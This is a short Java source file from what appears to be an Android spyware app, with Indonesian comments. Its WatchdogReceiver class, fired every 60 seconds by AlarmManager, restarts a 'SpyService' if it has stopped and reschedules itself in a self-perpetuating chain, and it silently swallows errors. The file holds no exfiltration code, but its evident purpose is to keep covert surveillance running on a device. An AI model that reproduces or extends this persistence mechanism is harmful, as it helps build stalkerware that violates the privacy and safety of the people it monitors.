package com.nullx.pp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

/**
 * WatchdogReceiver — dipanggil AlarmManager tiap 60 detik
 *
 * Tugasnya: pastikan SpyService masih hidup.
 * Kalau mati → nyalain lagi.
 * Setelah itu → reschedule alarm berikutnya (self-perpetuating chain).
 */
public class WatchdogReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        // Nyalain SpyService kalau mati
        startSpyService(context);

        // Reschedule alarm berikutnya — chain tidak putus
        SpyService.scheduleAlarmWatchdog(context);
    }

    private void startSpyService(Context context) {
        try {
            Intent serviceIntent = new Intent(context, SpyService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
        } catch (Exception e) {}
    }
}
